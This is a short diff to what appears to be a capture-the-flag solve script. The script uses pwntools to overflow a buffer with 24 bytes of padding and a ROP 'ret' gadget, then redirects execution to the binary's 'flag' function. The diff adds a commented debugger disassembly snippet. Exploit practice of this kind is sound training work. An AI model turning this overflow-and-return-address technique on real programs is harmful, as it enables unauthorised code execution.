@@ -67,3 +67,10 @@ ret = rop.find_gadget(['ret'])[0]
 p.sendline(b'A'*24 + p64(ret) + p64(exe.sym.flag))
 
 p.interactive()
+
+
+'''
+00007FF68303461E
+00007FF68303465D | 48:B8 C8DF2875715C8B43   | mov rax,438B5C717528DFC8                |
+'''
+
